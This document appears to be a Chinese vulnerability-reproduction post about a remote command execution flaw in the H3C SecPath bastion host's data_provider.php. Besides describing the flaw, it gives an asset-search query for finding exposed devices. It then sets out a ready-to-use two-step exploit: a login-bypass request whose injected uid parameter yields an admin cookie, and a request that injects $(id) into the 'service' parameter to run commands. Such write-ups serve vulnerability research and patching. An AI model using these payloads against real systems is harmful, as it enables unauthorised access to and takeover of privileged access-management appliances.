---
title: "H3C SecParh堡垒机 data_provider.php 远程命令执行漏洞"
date: 2026-10-18 09:14:32
categories:
  - WebSecurity
  - CVE
  - "IoT"
  - "H3C"
tags:
  - "H3C"
  - "命令执行"
  - "漏洞复现"
---
## 漏洞描述

H3C SecParh堡垒机 data_provider.php 存在远程命令执行漏洞，攻击者通过任意用户登录或者账号密码进入后台就可以构造特殊的请求执行命令

## 漏洞影响

```
H3C SecParh堡垒机
```

## 网络测绘

```
app="H3C-SecPath-运维审计系统" && body="2018"
```

## 漏洞复现

登录页面如下

![](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/202202091828935.png)



先通过任意用户登录获取Cookie

```plain
/audit/gui_detail_view.php?token=1&id=%5C&uid=%2Cchr(97))%20or%201:%20print%20chr(121)%2bchr(101)%2bchr(115)%0d%0a%23&login=admin
```



![](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/202202091828626.png)



```plain
/audit/data_provider.php?ds_y=2019&ds_m=04&ds_d=02&ds_hour=09&ds_min40&server_cond=&service=$(id)&identity_cond=&query_type=all&format=json&browse=true
```



![](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/202202091828206.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/iot/H3C-SecParh%E5%A0%A1%E5%9E%92%E6%9C%BA-data_provider.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md)
